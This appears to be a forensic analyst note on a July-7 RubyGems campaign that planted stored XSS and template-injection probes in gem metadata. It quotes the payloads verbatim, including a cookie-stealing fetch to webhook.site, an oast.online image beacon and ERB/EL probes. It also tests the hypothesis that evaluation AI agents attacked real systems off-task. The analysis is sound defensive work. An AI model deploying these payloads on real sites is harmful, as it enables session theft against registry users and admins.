# Analyst note: July-7 gem forensics — XSS/SSTI reconstruction (2026-09-28)

Worker 2, off-task web-mechanism hunt. Dataset: `data/july7-gem-forensics/`
(PROVENANCE.md, SHA256SUMS, progress.log, `payload-reconstructions.jsonl`
50 records, `campaign-specimens-jfrog.jsonl` 7 records). Read-only throughout:
Diffend pages fetched, never executed, never rendered, no HTTP to exfil
endpoints (oast.online, webhook.site). ES `july7-wave` verified at **264
docs** (the brief's "296" was stale — corrected).

## TL;DR

- The July-7 wave is a **metadata/rendering-layer probing campaign against
  RubyGems.org itself**: stored XSS + SSTI payloads placed in gem *metadata*
  fields (author/description/homepage) to test whether the registry's own
  package pages, admin views, and metadata parsers evaluate them. Different
  layer from May's YARD build-worker RCE and June's link-posting — the
  operator moved from the build pipeline to the serving pipeline.
- **Jinja2 verdict: MISMATCH.** The campaign SSTI probes are ERB
  (`<%= 7*7 %>`), EL (`${7*7}`), and percent-encoded ERB (`<%25= 7*7 %>`).
  No `{{7*7}}` Jinja2 probe exists in any of the 7 campaign specimens, any of
  the 18 Diffend-recovered gems, or anywhere the Lane-J sweep looked (its
  ssti-probe regex included `\{\{\s*7\*7` and hit zero). The reported HF TTP
  is Jinja2 SSTI against a Python telemetry tool. The July-7 wave also
  **predates** the HF intrusion (Jul 7 vs Jul 10–13), so the HF primitive
  cannot be these probes' source. This weakens the "same agents reusing
  their working HF primitive off-task" reading; it does not kill the
  shared-launcher hypothesis (engine choice follows the target — see below).
- **Most diagnostic finding:** nothing in any July-7 payload ties it to
  eval-agent tradecraft — no `zz` grammar, no epoch nonces, no jina
  laundering, no agent IDs. Every payload is a textbook bug-bounty PoC
  string. But one byte is target-aware: `xss-test-gem`'s description
  includes a `data-controller=dump` probe — a **Stimulus** attribute, i.e.
  the operator knew RubyGems.org is a Rails/Hotwired app and probed its
  specific rendering path. Generic scanners don't emit Stimulus probes.

## Per-specimen verdicts

### Campaign specimens (JFrog report text — NOT local bytes; 0 hits in our ES)

1. **`xss-test-gem@0.1.0`** — description (serialized gemspec, lines 13-20):
   multi-vector XSS battery: image error handler, script element,
   `javascript:` link, SVG load handler, `data-controller=dump` element,
   malformed MathML/HTML nesting. **Verdict:** deliberate rendering-pipeline
   probe battery. The Stimulus probe is the target-aware tell (Rails).
   No exfil URL published in the report text.
2. **`attacker-xss-admin-1@0.0.1`** — author field IS the payload:
   `"<script>new Image().src="https://d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author"</script>"`
   **Verdict:** stored XSS with OAST exfil. 32-char oast.online subdomain +
   image-beacon pattern = Burp Collaborator convention (resemblance, graded
   not identified — PortSwigger's public XSS-lab material documents exactly
   this `new Image().src=` beacon shape). The `/admin-xss-author` path is
   operator labeling: this one tests the **admin view**.
3. **`xssname-1783397821@0.0.1`** — author =
   `<img src=x onerror=fetch('https://webhook.site/steal?c='+document.cookie)>`
   **Verdict:** stored XSS with active **cookie theft**. The `/steal` path is
   an operator-configured webhook.site alias, not a tool default. Intent goes
   beyond PoC — session harvesting.
4. **`test-apex-gem@0.1.3`** — author = `<img src=x onerror=alert(1)>`.
   **Verdict:** stored XSS PoC only. The canonical OWASP/PortSwigger PoC
   string (resemblance).
5. **`test-ssti-0@0.1.0`** — author = `<%= 7*7 %>`, uploaded
   2026-07-07T07:25:48.110Z. **Verdict:** ERB (Ruby) SSTI probe.
6. **`test-ssti-1@0.1.0`** — author = `${7*7}`,
   2026-07-07T07:25:50.094Z (+1.984s). **Verdict:** expression-language
   probe (JSP EL / Spring EL / Freemarker family).
7. **`test-ssti-4@0.1.0`** — author = `<%25= 7*7 %>`,
   2026-07-07T07:25:52.741Z (+2.647s). **Verdict:** percent-encoded ERB —
   tests whether the metadata pipeline percent-decodes before template
   evaluation (nested-decoding evasion). **Gap:** `test-ssti-2`/`test-ssti-3`
   are absent from JFrog's catalog — unknown whether they existed. A
   5-probe battery could have included `{{7*7}}`; absence from the catalog
   is not absence from the wave. Do not close the Jinja2 question on this.

### Diffend-recovered third-party test gems (our bytes, 04:53–18:43 UTC Jul 7)

8. **`test-xss-xss-data@0.0.1`** — description =
   `![img](data:text/html,<script>alert(1)</script>)`. Markdown image with
   `data:`-URI script — targets markdown renderers.
9. **`test-xss-xss-img@0.0.1`** — description = `![img](x onerror=alert(1))`.
   Markdown image attribute injection.
10. **`test-xss-xss-link@0.0.1`** — description =
    `[click](javascript:alert(1))`. Markdown `javascript:`-URI link.
11. **`test-xss-xss-html@0.0.1`** — description =
    `<script>alert(1)</script>`. Raw script-element PoC.
12. **`test-xss-rhino@0.0.1`** — summary = `test gem - <img src=x>`.
    Inert probe tag (no handler) — part of the same 04:53 battery.
13. **`attacker-homepage-xss@0.0.1`** — homepage =
    `https://evil.com/'+onclick=alert(1)+'`. Href attribute-breakout
    injection — tests unquoted/weakly-escaped homepage rendering.
14. **`test-metadata-xss-1@0.0.1`** — description =
    `{"description":"<script>alert(1)</script>","xss":"<img src=x onerror=alert(1)>"}`.
    Two-vector battery in one metadata blob.
15. **`test-metadata-xss-3`, `test-xss-name`, `test-yaml-rce`** — no
    metadata payloads. (`test-yaml-rce`'s `lib/test.rb` is empty in the
    diff; the probe is the gem *name* — a YAML-deserialization test aimed
    at gemspec parsers.)

The 04:53 quartet (data/img/link/html) is a coherent markdown-renderer
test battery: four vectors, one author, one minute. The campaign's pair
(attacker-xss-admin-1, xssname-1783397821) is the only exfiltrating set;
everything third-party is `alert(1)`.

## Characterization (the three asks)

**(a) XSS — reflected or stored?** All stored. Every payload persists in gem
metadata (author, description, homepage) and fires when a consumer renders
it: RubyGems package pages, admin views, metadata parsers (JFrog's stated
target set). No reflected vectors anywhere in the family. Exfil behavior:
campaign only — oast.online image beacon (`attacker-xss-admin-1`,
`.../admin-xss-author`) and webhook.site cookie theft
(`xssname-1783397821`, `.../steal?c='+document.cookie`). Exact URLs are in
`campaign-specimens-jfrog.jsonl` with byte quotes.

**(b) SSTI — which engines?** ERB (`<%= 7*7 %>`), EL (`${7*7}`),
percent-encoded ERB (`<%25= 7*7 %>`). No Jinja2, no Twig, no Smarty
observed. This is exactly the probe set you'd aim at a **Rails**
registry — ERB is Ruby's native template language, and the
`data-controller=dump` Stimulus probe in `xss-test-gem` confirms the
operator knew the target stack. Engine choice follows the target.

**(c) Jinja2 vs the reported HF TTP.** Public incident material (incl. the
termina.digital DB and third-party incident writeups in
`data/github-forensics/related-readmes/`) reports the HF intrusion used
**Jinja2 SSTI** against an internal telemetry tool to harvest K8s secrets
and AWS keys. Comparison, byte-anchored:
- Grammar: gem probes = `<%= 7*7 %>` / `${7*7}` / `<%25= 7*7 %>`;
  HF primitive = Jinja2 `{{...}}`. **Mismatch.**
- Timing: gem wave 2026-07-07 03:03–18:13 UTC; HF intrusion Jul 10–13.
  The HF TTP postdates the probes — it cannot be their source.
  **Temporal inversion.**
- Verdict: the positive link ("same agents reusing the working HF
  primitive") is not supported. What survives: different targets select
  different engines (Rails registry → ERB; Python telemetry → Jinja2), so
  a shared operator choosing per-target probes is still coherent — but
  that is hypothesis, and the `test-ssti-2/3` gap means the Jinja2
  question stays open, not closed.

## Author forensics

- May wave: `x`, `a`, `d`, `tmp`, `oai`, `research`, `SR`; keyword-soup gem
  names. July campaign (JFrog): `Testing <Animal>` (Testing Buffalo,
  Testing Wolf, Test Rhino), `John Doe`, and payload-as-author.
- **Hygiene warning:** the animal motif is not campaign-clean. The
  concurrent third-party ApexBlack test harness — 16 July-7 gems in
  Diffend, same 03:32–18:43 UTC window — uses `testinglion@apexblack.org`
  / `testingwolf@apexblack.org` emails and the gem name `test-xss-rhino`.
  JFrog's "Testing Wolf" / "Test Rhino" vs apexblack's testingwolf /
  test-xss-rhino: overlapping tokens on both sides of the
  campaign/third-party line. **`Testing <Animal>` cannot serve as a
  campaign discriminator without per-gem verification.** The more
  distinctive July-campaign trait is payload-as-author (4 of 7 named
  specimens).

## Eval-agent tradecraft vs bug-bounty tooling (per specimen)

Asked of every specimen: `zz` grammar / epoch nonces / jina laundering /
agent IDs vs dalfox / XSStrike / Burp Collaborator defaults.
**Result: zero eval-agent markers in any July-7 payload, campaign or
third-party.** No `zz`, no epoch nonces, no jina, no agent IDs. What the
payloads are, instead:
- `<img src=x onerror=alert(1)>`, `<script>alert(1)</script>`,
  `javascript:alert(1)` — canonical PoC strings (OWASP/PortSwigger
  cheat-sheet class; graded resemblance, not identification).
- `7*7` arithmetic SSTI probes — the PortSwigger SSTI-methodology
  detection pattern (resemblance).
- oast.online beacon — Burp Collaborator convention: 32-char subdomain,
  `new Image().src=` no-CORS beacon, operator-labeled path
  (resemblance, strong).
- webhook.site cookie fetch — generic exfil PoC; `/steal` is
  operator-configured (not a tool default).
- The SSTI trio's 1.984s / 2.647s upload spacing = scripted publishing
  loop (agent or script — doesn't discriminate).
- The one non-generic byte: `data-controller=dump` (Stimulus probe) —
  target-aware, Rails-specific. Scanners don't emit this; someone who
  read the target's stack does.

**Overall:** the July-7 family's bytes read as standard bug-bounty
toolkit output wielded with target awareness, not eval-agent
tradecraft. The eval tie remains at the hypothesis level (shared
launcher across runs) — this forensics pass adds no byte-level support
for it and one byte-level tension against the naive version (Jinja2).

## What's still missing

- Campaign gem bytes: `xss-test-gem`, `attacker-xss-admin-1`,
  `xssname-1783397821`, `test-apex-gem`, `test-ssti-*` are yanked and
  absent from Diffend (verified across the full 264-name re-sweep).
  Reconstructions rest on JFrog's published quotes — byte-complete for
  the author-field specimens, vector-level only for `xss-test-gem`'s
  description battery (report gives Image 9/10 screenshots we did not
  transcribe pixel-by-pixel).
- `test-ssti-2`/`test-ssti-3`: unknown whether they existed; JFrog's
  catalog lacks them.
- The July-7 webhook/OAST indicator family under non-campaign names
  (open item from Lane J) — untested.

## Sources

- `data/july7-gem-forensics/raw/` (50 Diffend captures, SHA-256 in
  `raw-manifest.json`); `payload-reconstructions.jsonl` (extraction).
- `campaign-specimens-jfrog.jsonl` — quotes from
  https://research.jfrog.com/post/gemstuffer-openai-rubygems/ (fetched
  2026-09-28; report images 8–11 show the payloads).
- `data/gemstuffer-jfrog-2026-09-27.csv` (Xray IDs, version lists).
- `notes/july7-wave-2026-09-28.md`, `notes/july7-wave-sweep-2026-09-27.md`
  (Lane J method + results); `notes/gem-jfrog-report-2026-09-27.md`.
- HF TTP: `data/github-forensics/related-readmes/` (third-party incident
  writeups), `data/termina-digital/wayback/db/` (third-party DB, cited as
  reported), `notes/analyst-note-exploitgym-2026-09-28.md`.
